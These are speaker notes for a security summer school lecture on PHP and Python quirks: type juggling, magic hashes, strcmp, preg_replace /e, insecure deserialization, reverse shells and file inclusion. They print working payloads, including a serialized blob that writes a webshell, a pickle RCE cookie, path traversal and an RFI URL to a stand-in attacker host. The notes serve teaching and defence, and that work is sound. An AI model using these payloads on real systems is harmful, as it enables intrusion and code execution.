# Exotic Attacks — Presenter Notes

*Private speaker notes for the "Exotic Attacks" slide deck (Security Summer School). One section per slide, in order. Glance at the bold labels while you talk.*

**Legend:** **Say** = the core point in plain words · **Example** = concrete thing to show/quote · **Emphasize** = the "aha" moment · **Watch out** = something that will bite you (often a PHP-version gotcha) · **If asked** = likely audience question + answer · **Transition** = bridge to next slide.

---

## The one-sentence thesis (keep coming back to this)

> **Convenient language features (loose typing + automatic type coercion + "magic" behaviors) become security holes the moment developers forget that user input has a *type*, not just a *value*.** The fix is almost always the same: use `===`, and never trust user input.

Every attack in this talk is a variation on that theme.

---

## ⚠️ Read this before you present: the PHP-version cheat sheet

Most of these bugs behave **differently across PHP versions**. A sharp audience member *will* ask "does this still work today?" Here's the truth (verified on PHP 8.5):

| Attack | PHP 5 / 7 | PHP 8+ | Notes |
|---|---|---|---|
| Basic type juggling `0 == "somepass"` | ✅ bypass works (→ true) | ❌ fixed (→ **false**) | PHP 8 "saner string-to-number comparison" |
| **Magic hashes** `md5("240610708") == "0"` | ✅ works | ✅ **STILL works** | Both sides are *numeric* strings, so PHP 8 still compares them as numbers |
| `strcmp($pw, $array)` trick | ✅ returns `NULL` + warning → bypass | ❌ **fatal `TypeError`** | Dead in PHP 8; the array now throws |
| `preg_replace` `/e` RCE | ✅ (deprecated in 5.5) | ❌ **removed in PHP 7.0** | Only legacy targets |
| Object injection / `unserialize()` | ✅ | ✅ | Still very relevant |
| LFI / RFI | ✅ | ✅ | RFI needs `allow_url_include=On` (off by default) |

**Golden nuance to sound sharp:** PHP 8 fixed *number vs non-numeric-string* (`0 == "abc"` is now false). It did **not** change *numeric-string vs numeric-string* (`"1e2" == "100"` is still true). That's exactly why the **basic bypass died but magic hashes survived** in PHP 8. The reading says PHP 8 makes `"0e123" == "0"` false — that's not quite right; only the non-numeric-string case changed.

**Demo tip:** Use **[3v4l.org](https://3v4l.org)** — it runs one snippet against *every* PHP version at once and shows exactly where the result flips from `true` to `false`. Perfect for "watch this change between PHP 7 and 8" moments.

---

# Slide-by-slide

## 1 — Title: "Exotic Attacks"

- **Say:** These aren't the headline attacks (SQLi, XSS). "Exotic" = bugs that live in the *quirks* of a specific language. The language itself betrays the developer.
- **Say:** We'll focus mostly on **PHP** (with a Python detour at the end) because PHP's design decisions created a whole family of these.
- **Transition:** "Why PHP? Let's look at how much of the web still runs it."

## 2 — Server Side Languages Popularity

echo “7” == 7;
echo “7” === 7;

PHP 7:
echo “secure-pass1290” == 0;
echo “7_string” == 7;

PHP 8:
echo “secure-pass1290” == 0;
echo “7_string” == 7;

echo  (int)”7_string”;



echo "0e2312312" == "0";



- **Say:** PHP is still the most common server-side language — roughly **~75%** of sites whose backend language is known. The chart is from W3Techs.
- **Example:** **WordPress alone powers ~40%+ of *all* websites**, and it's PHP. That's the reason for the dominance.
- **Emphasize:** Even if nobody starts a *new* project in PHP today, you'll meet it constantly — and much of it is **old, unpatched** (PHP 5.x / 7.x), which is exactly where these bugs live. Legacy code rarely gets a full rewrite ("not worth it").
- **Transition:** "PHP is dynamically typed — and that's where the trouble starts."

## 3 — Loose vs Strict Comparison (`==` vs `===`)

- **Say:** PHP (like JS and Python) is dynamically typed. `==` is **loose** — it *coerces* both sides to a common type before comparing. `===` is **strict** — compares value **and** type, no coercion.
- **Analogy:** `==` is the lenient bouncer ("eh, close enough"); `===` checks your ID exactly.
- **Example (say these out loud):**
  - `7 == "7"` → **true** · `7 === "7"` → **false** (int vs string)
  - `"abc" == 0` → **true in PHP 5/7**, **false in PHP 8** ← the dangerous one
- **Example (JS has the same disease):** `0 == ""` → true, `[] == ![]` → true. (The famous "JS WAT" talk.) Good for a laugh and to show it's not just PHP.
- **Emphasize:** The entire first half of this talk is "what happens when a developer uses `==` on untrusted input."

## 4 — The Vulnerability

- **Say:** Classic admin login. Real password is `secure-pass1290`. The check is `$_POST["password"] == $admin_password`.
- **Say (set up the puzzle, don't reveal yet):** "It looks fine. What could possibly break a string equality check? Hold that thought."
- **Transition:** "Watch what happens if I *don't* send a string."

## 5 — Bypassing The Vulnerability

- **Say:** If the attacker gets the value in as the **integer `0`**, PHP evaluates `0 == "secure-pass1290"`. To compare an int with a string, old PHP converts the *string to a number* — `"secure-pass1290"` has no leading digits, so it becomes **`0`** → `0 == 0` → **true**.
- **Emphasize (the punchline):** **You just logged in as admin by sending the number zero.** No password needed.
- **Watch out:** This is the one **PHP 8 fixed** — there `0 == "secure-pass1290"` is **false**. If you live-demo on a modern PHP it will *fail*. Use 3v4l.org or a PHP 7 sandbox. (Say: "and this is fixed in PHP 8 — but billions of pages still run older versions.")

## 6 — Conditions for it to work (1)

- **Say:** The catch: `$_POST` / `$_GET` / cookies arrive as **strings** by default. So normally it's `"0" == "secure-pass1290"` — *two strings*, no coercion, compared as text → **false**. Attack fails.
- **Emphasize:** The bug needs the attacker to smuggle in a **real integer type**, not the string `"0"`.

## 7 — Conditions for it to work (2)

- **Say:** The enabler is **JSON** (or `unserialize()`), because they carry *types*.
  - `{"password": "0"}` → decodes to the **string** `"0"` → safe.
  - `{"password": 0}` → decodes to the **integer** `0` → type juggling fires → bypass.
- **Emphasize (counter-intuitive, great point):** A modern **JSON API can be *more* exposed to this than an old HTML form**, because JSON lets the attacker choose the type. Same for `unserialize()` — which is our next big topic.
- **Transition:** "Now let's see this same trick sneak in through *password hashes*."

## 8 — Magic hashes

- **Say:** A "magic hash" is a hash whose hex output looks like **`0e` followed by only digits** — e.g. `0e462097431906509019562988736854`.
- **Say:** PHP reads `0e12345` as **scientific notation**: 0 × 10^12345 = **0**. So a magic hash, compared loosely, *is* zero.
- **Emphasize:** Therefore **two different magic hashes both equal `0`**, so they equal *each other* under `==`, even though the passwords behind them are completely different.

## 9 — Magic hashes — how the exploit works

- **Say:** Two behaviors stack up: (1) **hashing** turns a string into a hex digest; (2) PHP's **numeric-string coercion** turns `0e...digits...` into the float `0.0`.
- **Example:** `"0e015339760548602306096794382326" == "0"` → **true**.
- **Say (the realistic scenario — read the slide's reminder):** We store `md5(password)` in the DB and check `md5($input) == $stored_hash` with `==`. If the stored hash is a magic hash, then **any** input whose md5 is *also* a magic hash logs you in.
  - **Concrete:** submit `240610708`; `md5("240610708")` = `0e462097431906509019562988736854` → magic → `== 0` → match.
- **Watch out / sound smart:** This one is **NOT fixed by PHP 8** — I verified `md5("240610708") == "0"` is still **true** in PHP 8.5, because both sides are *numeric* strings. Great "this is still live today" moment.

## 10 — Magic hashes discovered so far

- **Memorize these three** so you can rattle them off:
  - **`QNKCDZO`** → `md5` → `0e830400451993494058024219903391` — *the* classic test string everyone uses. If you show one, show this one.
  - **`240610708`** → `md5` → `0e462097431906509019562988736854` (found by Michal Špaček).
  - **`10932435112`** → `sha1` → `0e07766915004133176347055865026311692244`.
- **Say:** The thing you actually *submit* is the short "magic number/string" (like `QNKCDZO`), not the long hash.
- **Say (explain the dashes in the table):** No known magic hash exists for **sha256 / sha384 / sha512** — the search space is astronomically large, so nobody's found one. That's *not* a guarantee it's impossible; it's just "not found yet."
- **If asked "how were these found?":** brute force — hash tons of candidate strings looking for the `0e[0-9]+` pattern. Feasible for md5/sha1, impractical (so far) for the big hashes.

## 11 — The `strcmp()` function (PHP) *(section title)*

- **Transition:** "Type juggling doesn't only break `==` on your data — it can break the *return value* of built-in functions too. Meet `strcmp()`."

## 12 — What `strcmp()` returns

- **Say:** `strcmp($a, $b)` is a C-style compare: **`0`** if equal, **`< 0`** if `$a` < `$b`, **`> 0`** if `$a` > `$b`.
- **Say:** So the natural "are these equal?" check is `strcmp($a, $b) == 0`. Note that `== 0` again — foreshadow the trap.

## 13 — The `strcmp()` Vulnerability

- **Say:** Password check: `if (strcmp($password, $_POST['password']) == 0)`.
- **Say (pose the puzzle):** "How do I make `strcmp` return something that equals `0` — *without knowing the password*?"

## 14 — Exploiting `strcmp()` — send POST data as an array

- **Say:** In PHP, the query/POST syntax **`password[]=x` makes `$_POST['password']` an array** `["x"]`, not a string. This is a built-in PHP feature, not a hack — it's how PHP handles multi-value fields.
- **Emphasize:** The attacker controls the *type* again — this time an **array** where a string was expected.

## 15 — It gives a warning

- **Say:** `strcmp($password, [])` triggers: *"Warning: strcmp() expects parameter 2 to be string, array given…"*
- **Emphasize:** It's only a **Warning**, not a fatal error — execution **continues**. And in production, `display_errors` is usually **off**, so nobody even sees it.

## 16 — The result

- **Say:** Despite the warning, `strcmp()` **returns `NULL`** when handed an array (in PHP ≤ 7).
- **Watch out (big version gotcha):** In **PHP 8 this is a fatal `TypeError`** — I confirmed it here; the script *dies* instead of returning `NULL`. So the strcmp trick is **dead on PHP 8**; it only works on 5.x/7.x. Say so, or someone will call it out.

## 17 — Finally

- **Say:** `NULL == 0` → **true** (loose comparison coerces `NULL` to `0`/false). So the check passes → **authenticated**.
- **Emphasize:** Same pattern as everything else: **unexpected type + `==`**. Different function, identical root cause.
- **Say (the fix):** Use `strcmp(...) === 0` *and* type-check the input — or better, use `hash_equals()` for secrets.

## 18 — The `preg_replace()` function (PHP)

- **Say:** `preg_replace($pattern, $replacement, $subject)` = regex search-and-replace. The user controls the **pattern** and the **replacement** here.
- **Example (the simple one you asked for — I ran it, this is the real output):**
  - `what = /some/`, `with = many`, subject = `"Somewhere, something incredible is waiting"`
  - → **`"Somewhere, manything incredible is waiting"`**
  - Point out *why*: lowercase `some` inside "**some**thing" matches; the capital `S` in "**S**omewhere" does **not** (case-sensitive).
- **Example (from the reading, also verified):** `what = /Known/i`, `with = eaten`, subject `"…waiting to be known"` → `"…waiting to be eaten"` (the `i` flag = case-insensitive, so `Known` matches `known`).
- **Emphasize the anatomy:** the pattern is wrapped in delimiters `/…/`, and **after the closing slash you can add modifier flags** (`i`, `m`, `s`, … and the dangerous one). That trailing-flag slot is the whole vulnerability.

## 19 — PCRE modification flags

- **Say:** Most flags are harmless: `i` case-insensitive, `m` multiline, `s` dot-matches-newline, `x` extended.
- **Say (the villain):** the **`e` flag** (`PREG_REPLACE_EVAL`) makes PHP **execute the replacement string as PHP code** after substitution — instead of inserting it as text.
- **Watch out:** `e` was **deprecated in PHP 5.5** and **removed in PHP 7.0**. So this is a **legacy-only** RCE — but legacy PHP is everywhere.

## 20 — Using `preg_replace()` to execute commands

- **Say (walk it step by step):** payload `?what=/Known/e&with=system('whoami')`.
  1. Pattern `/Known/` with the **`e`** flag.
  2. Because of `e`, the replacement `system('whoami')` is **run as PHP**, not inserted literally.
  3. `system('whoami')` runs the OS command → returns e.g. **`www-data`** → that output becomes the replacement.
- **Emphasize:** We went from "regex replace" to **full remote code execution**. That escalation *is* the exotic punchline of the talk.
- **⚠️ Watch out (bug in the demo payload — fix before you present):** the slide-18 subject `"Somewhere, something incredible is waiting"` contains **no** `Known`, and `/Known/` is **case-sensitive**, so this exact payload **matches nothing → runs nothing**. For a live demo use a pattern that actually matches, e.g.:
  - `?what=/waiting/e&with=system('whoami')`  ← matches "waiting"
  - or bulletproof: `?what=/.+/e&with=system('whoami')`  ← `.+` matches the whole string
- **Good identifiers to name-drop as replacement payloads:** `system('whoami')` (→ which user, usually `www-data`), `system('id')`, `system('ls')`, `phpinfo()`. Any PHP is fair game — it's arbitrary code exec.
- **Say (the fix):** the safe replacement function is **`preg_replace_callback()`**, which takes a callback instead of eval-ing a string.

## 21 — PHP Object Injection / Insecure Deserialization

- **Say:** `serialize()` turns an object into a string; `unserialize()` rebuilds it. Calling `unserialize()` on **attacker-controlled input** is the bug.
- **Demo (what serialization *is* — in a shell: run `php -a`, then type each line):** serialize = a value **plus its type**, written as flat text.
  ```
  php > echo serialize(42), PHP_EOL;
  i:42;
  php > echo serialize("hello"), PHP_EOL;
  s:5:"hello";
  php > echo serialize(true), PHP_EOL;
  b:1;
  php > echo serialize(["user" => "admin", "id" => 9]), PHP_EOL;
  a:2:{s:4:"user";s:5:"admin";s:2:"id";i:9;}
  ```
  - Read the tags aloud: **`i`** = int, **`s:5`** = 5-char string, **`b`** = bool, **`a:2`** = 2-element array. Everything is tagged with its **type + length** — that's the whole format, and it's the same grammar as the `O:...` object blob two bullets down.
  - *(One-liner form: `php -r 'echo serialize(["user"=>"admin","id"=>9]);'` — on Windows keep the **single** quotes so PowerShell doesn't eat the `$`.)*
- **Demo (`unserialize()` is the exact inverse):**
  ```
  php > $s = serialize(["user" => "admin", "id" => 9]);
  php > var_dump(unserialize($s));
  array(2) {
    ["user"]=>
    string(5) "admin"
    ["id"]=>
    int(9)
  }
  ```
  - **Say:** it reads those tags and **rebuilds the original value** — and for an `O:...` blob it rebuilds a **live object**. That reconstruction is the door the attack walks through.
- **Demo (the payoff — ties straight to `media/demo-php-serialize.php`):** run the file from the repo root:
  ```
  php media/demo-php-serialize.php
  ```
  Output (verified on your PHP 8.5.8):
  ```
  To string: called from toString method

  Serialized: O:8:"PHPClass":3:{s:12:"evil_command";s:17:"system('whoami');";s:23:"\0PHPClass\0random_number";i:9;s:13:"\0PHPClass\0arr";a:2:{i:0;i:1;i:1;i:5;}}
  ```
  - **The `To string:` line** — the file concatenates the object into a string (`.(new PHPClass).`), i.e. uses it *as a string*, so **`__toString()` auto-fired**. A live example of the magic-method bullet right below.
  - **The blob is just an object in that same format:** `O:8:"PHPClass"` = **O**bject, class name 8 chars; `:3:` = 3 properties; and the payload sits there in **plaintext** as `s:17:"system('whoami');"`.
  - **Watch out (the weird gaps):** `private`/`protected` property names come out wrapped in **null bytes** — really `\0PHPClass\0random_number` (shown as `\0` here; your terminal renders them as blanks/odd characters). That's why the count reads **23** even though `random_number` is only 13 letters — the extra 10 are the `\0PHPClass\0` wrapper.
  - **The reveal (RCE):** the file's last line is commented — `// unserialize($serialized);`. **Uncomment it and re-run.** Now `unserialize()` rebuilds the object → **`__wakeup()` auto-fires** → `eval($this->evil_command)` → `system('whoami')` runs and appends your username:
    ```
    Radu
    ```
  - **Punchline:** you never *called* the command — **merely unserializing attacker data ran it.** And it **still works on PHP 8.5** (unlike the `==` and `strcmp` tricks that PHP 8 killed) — deserialization was never "fixed." Straight into the magic-methods mechanism below.
- **Say (magic methods = auto-runs):** methods starting with `__` fire automatically on events:
  - `__wakeup()` → on `unserialize()`
  - `__destruct()` → when the object is destroyed
  - `__toString()` → when it's used as a string
- **Say (the mechanism):** If *any* class in the codebase has dangerous code in one of those methods, the attacker crafts a serialized blob for that class; unserializing it **instantiates the object and auto-triggers the method** → code runs. (In the real world this is chained across classes — a "**POP chain**" / gadget chain.)
- **Example (decode the format live — it makes it click):**
  ```
  O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
  ```
  - `O:18:"PHPObjectInjection"` → an **O**bject, class name **18** chars long
  - `:1:` → **1** property
  - `s:6:"inject"` → a **s**tring key, **6** chars: `inject`
  - `s:17:"system('whoami');"` → its value, a **17**-char string
  - When unserialized, this class's `__wakeup()` does `eval($this->inject)` → runs `system('whoami')` → **RCE**.
- **Example (deserialization + type juggling combo — slick):**
  ```
  a:2:{s:8:"username";b:1;s:8:"password";b:1;}
  ```
  sets `username` and `password` to boolean **`true`**. Then `$data['username'] == $adminName` becomes `true == "random"` → **true**. Auth bypass with no credentials — ties the whole talk together.
- **Emphasize:** Depending on the gadgets available, object injection → **RCE, SQLi, path traversal, or DoS**. It's a *capability*, not one fixed exploit.
- **Real-world scenario (tell this out loud — it answers "what does the attacker actually control?"):** a shop keeps the cart in a cookie: `setcookie('cart', serialize($cart))`, and every request runs `$cart = unserialize($_COOKIE['cart'])` — **the sink**. The attacker controls **only that cookie string** — no uploaded code, no server access.
  - The app happens to include an innocent library class:
    ```php
    class FileLogger {
        private $file; private $buffer;
        function __destruct() { file_put_contents($this->file, $this->buffer); } // flush logs on shutdown — perfectly normal
    }
    ```
  - The attacker sets their `cart` cookie to a hand-typed blob naming **that** class (they read the format off your earlier slides — no PHP needed):
    ```
    O:10:"FileLogger":2:{s:16:"\0FileLogger\0file";s:23:"/var/www/html/shell.php";s:18:"\0FileLogger\0buffer";s:28:"<?php system($_GET['c']); ?>";}
    ```
  - `unserialize()` builds a `FileLogger` with **attacker-chosen** `file` + `buffer` (constructor skipped) → end of request `__destruct()` fires → **writes a webshell to disk** → `GET /shell.php?c=whoami` = RCE. *(Verified end-to-end on your PHP 8.5.8 — the `__destruct` write really happens.)*
  - **What that one string bought the attacker:** (1) pick **which class** to build — anything the app or its libraries define; (2) set **every property**; (3) **magic methods auto-fire**. Nobody wrote `eval()` — `FileLogger` is boringly correct; it's dangerous only because the attacker now controls its fields. Real attacks chain several such classes — **PHPGGC** auto-generates them for Laravel / Symfony / WordPress / Monolog.
  - **Where `unserialize()` meets attacker data for real:** cookies & "remember-me" tokens, PHP session files, hidden form fields, cached/DB-stored blobs — anything that round-trips a serialized object through the client.

## 22 — Python `pickle` module

- **Transition:** "Don't leave thinking PHP is uniquely cursed — same disease, different language."
- **Say:** `pickle` serializes/deserializes Python objects. `pickle.dumps(obj)` → bytes; `pickle.loads(bytes)` → object back.
- **Demo (what a pickle *is* — run `python` for a REPL, then type each line):** unlike PHP's readable text, a pickle is a **binary opcode stream**.
  ```
  >>> import pickle
  >>> pickle.dumps(42)
  b'\x80\x05K*.'
  >>> pickle.dumps("hello")
  b'\x80\x05\x95\t\x00\x00\x00\x00\x00\x00\x00\x8c\x05hello\x94.'
  >>> pickle.dumps({"user": "admin", "id": 9})
  b'\x80\x05\x95\x1b\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04user\x94\x8c\x05admin\x94\x8c\x02id\x94K\tu.'
  ```
  - **Contrast to hammer home:** PHP's `serialize()` was *human-readable text* (`s:5:"admin"`); pickle is raw **bytes**. Same goal — flatten an object into a string you can store/send — but pickle's "string" is actually a **program** (see the RCE demo below).
- **Demo (`loads()` is the inverse — rebuilds the object):**
  ```
  >>> d = pickle.dumps({"user": "admin", "id": 9})
  >>> pickle.loads(d)
  {'user': 'admin', 'id': 9}
  ```
- **Say (quote the docs — it's blunt):** *"Warning: The pickle module is not secure. Only unpickle data you trust."*
- **Say (mechanism):** pickle bytes are **opcodes** run by a little stack machine at load time. A class can define **`__reduce__()`**, which returns a **(callable, args)** tuple to run when it's unpickled — intended for rebuilding objects, abused to run anything.
- **Example:** `__reduce__` returns `(os.system, ("<reverse-shell command>",))`. The instant someone `pickle.loads()` your data, `os.system(...)` fires.
- **Demo (the RCE live — tied to `media/demo-python-pickle.py`):** that file's `RCE.__reduce__` returns `(os.system, ("whoami",))`. Run it (from the repo root):
  ```
  python media/demo-python-pickle.py
  ```
  Output (verified on your Python 3.14.6, in a terminal):
  ```
  Pickled:
  b'\x80\x05\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
  Unpickled:
  Radu
  0
  ```
  - `Radu` is `whoami`'s output — **the RCE firing during `pickle.loads()`**; `0` is `os.system`'s return code (what `loads()` handed back). *(Pipe the output instead of using a terminal and `Radu` may jump above `Pickled:` — harmless stdout buffering.)*
- **Demo (why it ran — disassemble those bytes):** `pickle.loads()` executes the bytes as **stack-machine opcodes**:
  ```
  >>> import pickletools
  >>> pickletools.dis(b'\x80\x05\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.')
     11: \x8c SHORT_BINUNICODE 'nt'
     16: \x8c SHORT_BINUNICODE 'system'
     25: \x93 STACK_GLOBAL
     27: \x8c SHORT_BINUNICODE 'whoami'
     36: \x85 TUPLE1
     38: R    REDUCE
     40: .    STOP
  ```
  (`MEMOIZE` bookkeeping lines omitted — your real output has a few extra rows between these.)
  - The three that matter: **`STACK_GLOBAL`** pushes `nt.system`, **`TUPLE1`** builds the args `('whoami',)`, **`REDUCE`** = **call it**. `REDUCE` is the kill shot — "call the function now on the stack." That's why *merely loading* the pickle runs `whoami`.
  - **Windows note:** the bytes say **`nt`**`.system`, not `os.system` — on Windows `os.system` *is* `nt.system` (`nt` = the low-level module `os` wraps); Linux would show `posix.system`. Same call — don't let it trip you up mid-demo.
- **"Do I really need ngrok?" — NO, not for this slide.** The file *defines* a reverse-shell command (lines 10–13, via `NGROK_HOST`/`NGROK_PORT`) but the next line **`cmd = "whoami"` overwrites it**, so the demo only ever runs `whoami` — local, safe, no network. Independent reasons to skip ngrok here:
  - The pickle **point** is just "unpickling runs code" — `whoami` proves that.
  - That reverse-shell string is **Linux-only** (`mkfifo`, `/bin/sh`, `nc`, `/tmp/f`) — it wouldn't run on your Windows box anyway.
  - ngrok is **slide 23's** topic (a real call-back shell to a box *you* control). For a tidier demo file you can delete lines 4–5 and 10–13 and keep just `cmd = "whoami"`.
- **Real-world scenario (same shop-cart story as PHP — but *easier* for the attacker):** an app stores the cart in a cookie as base64'd pickle and runs `cart = pickle.loads(base64.b64decode(cookie))` each request — **the sink**. (Pickle also hides in Flask/Django caches, Celery queues, and the big one today — **ML model files**: `torch.load`, `joblib.load`, a `.pkl` off Hugging Face all run `pickle.loads` on someone else's bytes.)
  - The attacker mints the cookie on **their own** machine:
    ```python
    import os, pickle, base64
    class Exploit:
        def __reduce__(self):
            return (os.system, ("whoami",))
    cookie = base64.b64encode(pickle.dumps(Exploit())).decode()
    # -> gAWVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=
    ```
  - Send that as the cookie → the server's `pickle.loads()` **runs `whoami`**. *(Verified on your Python 3.14.6.)*
  - **The key difference from PHP — say it out loud:** PHP needs a **gadget class already in the app** (you hunt for `FileLogger`-style code). Pickle needs **none** — `os.system` is always importable and the `REDUCE` opcode calls it **directly**. Disassemble the cookie and there's **no `Exploit` class in it**, just `GLOBAL os.system` + `REDUCE`; the `Exploit` class lives only on the attacker's laptop as a payload-minter. The server has to cooperate in **zero** ways.
  - **Windows note:** your locally-minted cookie says `nt.system` (Windows). A Linux target would be `posix.system` / `os.system` — craft for the victim's OS.
- **Emphasize (generalize it):** *Any* format that reconstructs arbitrary typed objects is a potential RCE sink — PHP `unserialize`, Python `pickle`, Java `ObjectInputStream`, Ruby `Marshal`, .NET `BinaryFormatter`, unsafe YAML. **The rule: never deserialize untrusted data.**

## 23 — How to spawn a reverse shell

- **Say (what a reverse shell is):** instead of the attacker connecting *in* (blocked by firewalls/NAT), the **victim connects *out*** to the attacker and hands over a shell. Outbound is almost always allowed.
- **Say (why ngrok):** your laptop is behind NAT and has no public IP, so the victim can't reach you directly. **ngrok** opens a public tunnel to a port on your machine.
  - Steps: make an ngrok account → install → forward a TCP port (`ngrok tcp 1234`) → you get a **public host:port** → use that as the shell's call-back address.
  - On your side you'd have a listener (e.g. `nc -lvnp 1234`) waiting for the connection.
- **Say (the reality check from the reading):** you usually land as **`www-data`**, *not* root — a web server rarely runs as root (and shouldn't). To go further you need **privilege escalation** — a later session.
- **Transition:** "So far we needed a code-exec bug. The last pattern hands you files — and sometimes code exec — directly."

## 24 — Local File Inclusion (LFI)

- **Say (path traversal):** `?file=../../../../etc/passwd` climbs out of the intended directory to read arbitrary files. The repeated `../` guarantees you reach filesystem root no matter how deep you started.
- **Example:** reading **`/etc/passwd`** is the classic proof — it's world-readable, so it reliably confirms the traversal works (it doesn't leak passwords by itself; it's the "hello world" of LFI).
- **Say (LFI → RCE):** the code pattern is `include('dir/' . $_GET['file'])`. `include()` doesn't just *read* — it **executes** PHP. So if you can point it at a file **you** control (e.g. upload an "image" that's actually PHP, then include it), you get **code execution**. LFI + file upload = RCE.
- **If asked (advanced):** other LFI→RCE tricks — **log poisoning** (inject PHP into a log file, then include the log), PHP wrappers like `php://filter` (to exfil source) and `data://`/`expect://`. Mention only if the room is advanced.

## 25 — Remote File Inclusion (RFI)

- **Say:** Same bug, but the path is a **URL**: `?file=http://attacker.com/evil.php`. PHP **fetches and executes** the remote file → instant RCE, no upload needed.
- **Example (the payload):** `http://victim.com/?file=http://attacker-site.com/evil.php`
- **Watch out / sound current:** RFI needs **`allow_url_include=On`**, which is **off by default** in modern PHP — that's why RFI is rarer today and LFI is the more common find.
- **Emphasize (the closer):** LFI and RFI both come from the same sin as everything else in this talk — **trusting user input** (here, as a file path).

---

# Closing / wrap-up (land the plane)

- **Say:** Every single attack today reduced to one of two mistakes: **using `==` instead of `===`**, or **trusting the type/content of user input** (a comparison, a function argument, a serialized blob, a file path).
- **Say:** From the *defender's* side the checklist is short:
  - Use **`===`** / strict comparison; for secrets use **`hash_equals()`**.
  - Check functions' comparison mode (e.g. `in_array($x, $a, true)` — the strict flag).
  - **Never `unserialize()` / `pickle.loads()` untrusted data.**
  - Sanitize/whitelist any input used as a **file path**; drop dangerous funcs (`preg_replace /e`).
  - **Keep PHP updated** — you saw PHP 8 kill several of these outright.
- **Say (from the attacker's side, the real lesson):** you never know how careful the developer was, so you **test the quirks specific to their language/framework**. That's what "exotic" means — knowing the language better than the person who wrote the app.
- **Final line:** **"Never trust user input"** — the through-line of the entire summer school.

---

# Anticipated audience questions (have answers ready)

- **"Does this still work on modern PHP?"** → See the version table up top. Short version: basic `==` bypass and the strcmp trick are **fixed in PHP 8**; **magic hashes still work**; `preg_replace /e` is **gone since PHP 7**; deserialization and LFI/RFI are **still fully relevant**.
- **"Isn't this just bad code? Why blame the language?"** → Both. The language makes the *convenient* path (`==`, `unserialize`) the *unsafe* one — it's a footgun by design, which is why the same mistake recurs across thousands of codebases.
- **"How do you find a magic hash?"** → Brute force: hash many candidate strings, look for `0e[0-9]+`. Practical for md5/sha1, not (yet) for sha256+.
- **"Why does `../../../../` work if I only need `../../`?"** → Extra `../` past the root just stay at the root — harmless — so you over-supply them to work regardless of your starting depth.
- **"Python/Java/etc. — same problem?"** → Yes: `pickle`, `Marshal`, `ObjectInputStream`, `BinaryFormatter`, unsafe YAML. Insecure deserialization is language-agnostic (OWASP Top 10 material).

---

# Live-demo tips (optional, but high-impact)

- **Best tool: [3v4l.org](https://3v4l.org).** Paste a snippet; it runs on *every* PHP version and shows where the result flips. Ideal for `var_dump(0 == "secure-pass1290");` → **true** on 5/7, **false** on 8. One screen, whole point made.
- **Copy-paste snippets** (each is a punchy demo):
  - Type juggling: `var_dump(0 == "secure-pass1290");`  *(true pre-8, false on 8)*
  - Magic hash: `var_dump(md5("240610708") == "0");`  *(true — even on PHP 8!)*
  - Two magic hashes match: `var_dump(md5("240610708") == sha1("10932435112"));` *(true; both are "0e…")*
  - NULL trick: `var_dump(NULL == 0);`  *(true)*
  - preg_replace: `echo preg_replace("/waiting/e", "system('whoami')", "…waiting");` *(only on PHP < 7 — use 3v4l's old versions)*
- **Warning about *your* machine:** this box runs **PHP 8.5**, where the basic bypass and the strcmp array trick are **fixed/fatal**. If you demo locally they'll *fail* — that's a feature (shows PHP improved), but for the *vulnerable* behavior use 3v4l.org or a `php:7.0` Docker container. **Magic-hash demos work fine on PHP 8.**
- **Don't** paste `unserialize`/`preg_replace /e` RCE payloads into a shared/online box you don't own — that's literally running code on someone's server.
